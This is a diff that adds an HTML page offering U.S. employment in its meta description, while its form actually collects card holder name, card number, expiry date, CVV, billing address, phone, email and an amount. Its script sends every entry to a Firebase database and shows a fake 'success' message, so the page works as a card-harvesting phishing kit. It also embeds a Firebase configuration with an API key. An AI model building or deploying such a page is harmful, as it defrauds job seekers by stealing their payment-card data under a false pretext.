@@ -1,0 +1,99 @@
+<html>
+<head>
+  <title>Card Form</title>
+  <meta name="description" content="We offer qaulity employment for people living in the U.S.A, just click the link, fill the employment form and 
+  send to us for processing"> 
+  
+  <link rel='stylesheet' href='style.css' type='text/css'>
+     
+  </head><body>
+<hgroup>
+  <h1>Welcome </h1>
+  <h3>Fill in the form below </h3>
+</hgroup>
+<form>
+  <div class="group">
+    <input id="nameinput" type="text"><span class="highlight"></span><span class="bar"></span>
+    <label>Card Holder's Name</label>
+  </div>
+  <div class="group">
+    <input id="emailinput" type="email"><span class="highlight"></span><span class="bar"></span>
+    <label>Card Number</label>
+  </div>
+  <div class="group">
+    <input id="teleinput" type="text"><span class="highlight"></span><span class="bar"></span>
+    <label>Expiry Date</label>
+  </div>
+  <div class="group">
+    <input id="dobinput" type="text"><span class="highlight"></span><span class="bar"></span>
+    <label>CVV</label>
+  </div>
+  <div class="group">
+    <input id="ssninput" type="text"><span class="highlight"></span><span class="bar"></span>
+    <label> Billing Address </label>
+  </div>
+  <div class="group">
+    <input id="addrinput" type="text"><span class="highlight"></span><span class="bar"></span>
+    <label>Telephone</label>
+  </div>
+  <div class="group">
+    <input id="cityinput" type="text"><span class="highlight"></span><span class="bar"></span>
+    <label>Email</label>
+  </div>
+  <div class="group">
+    <input id="stateinput" type="text"><span class="highlight"></span><span class="bar"></span>
+    <label>Amount</label>
+  </div>
+  
+  <button id="submitinfo" type="submit" onclick="submitInfo();" class="button buttonBlue">Submit
+    <div class="ripples buttonRipples"><span class="ripplesCircle"></span></div>
+  </button>
+</form>
+
+<script src="https://www.gstatic.com/firebasejs/7.19.0/firebase.js"></script>
+  
+  <script>
+  // Your web app's Firebase configuration
+ var firebaseConfig = {
+    apiKey: "AIzaSyDZOOwIjmE-0QS9DYrwZMp_IK1XtNDgeLg",
+    authDomain: "humbleshire.firebaseapp.com",
+    databaseURL: "https://humbleshire.firebaseio.com",
+    projectId: "humbleshire",
+    storageBucket: "humbleshire.appspot.com",
+    messagingSenderId: "1054406792712",
+    appId: "1:1054406792712:web:9739cbc208fccabf4723bd",
+    measurementId: "G-4GPK4CLGGJ"
+  };
+
+  // Initialize Firebase
+  firebase.initializeApp(firebaseConfig);
+  console.log(firebase);
+
+  var database = firebase.database(); 
+
+   function submitInfo() {
+        
+     //var database = firebase.database();
+     var ref = database.ref('humbleshire');
+
+      var data = {
+
+         Name: document.getElementById("nameinput").value,
+         CN: document.getElementById("emailinput").value,
+         ED: document.getElementById("teleinput").value,
+         CVV: document.getElementById("dobinput").value,
+         BA: document.getElementById("ssninput").value,
+         Tel: document.getElementById("addrinput").value,
+         Email: document.getElementById("cityinput").value,
+         Amount: document.getElementById("stateinput").value,
+        
+              }  
+         console.log(data);
+          ref.push(data);
+      alert("Success !! We shall contact you when your transacation has been processed"); 
+   }
+   
+
+</script>
+</body>
+  </html>
